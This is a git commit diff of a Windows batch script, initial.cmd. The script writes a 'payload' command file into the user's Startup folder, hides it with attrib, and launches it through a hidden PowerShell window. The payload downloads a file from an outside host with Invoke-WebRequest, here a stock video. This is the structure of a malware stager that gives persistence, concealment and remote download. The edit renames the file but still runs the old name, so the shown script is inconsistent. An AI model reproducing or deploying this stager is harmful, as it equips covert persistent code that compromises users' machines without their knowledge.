f7c8f4ee2c809742857e14d89e96f91a9bb3dd4c
CHEPHYTY <soumyahembra123@gmail.com>
2024-05-18 13:38:12 +0530

    script and wget and readme and initial are updated

--- initial.cmd
+++ initial.cmd
@@ -13,10 +13,10 @@ set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 cd /d "%STARTUP%"
 
 @REM write payloads to startup
-(echo powershell -c "Invoke-WebRequest -Uri 'https://videos.pexels.com/video-files/2759477/2759477-uhd_3840_2160_30fps.mp4' -Outfile 'hello.mp4'") > stage2.cmd
+(echo powershell -c "Invoke-WebRequest -Uri 'https://videos.pexels.com/video-files/2759477/2759477-uhd_3840_2160_30fps.mp4' -Outfile 'hello.mp4'") > wget.cmd
 
 @REM hide the stage2.cmd file
-attrib +h stage2.cmd
+attrib +h wget.cmd
 
 @REM run payload 
 powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\stage2.cmd' -WindowStyle Hidden"
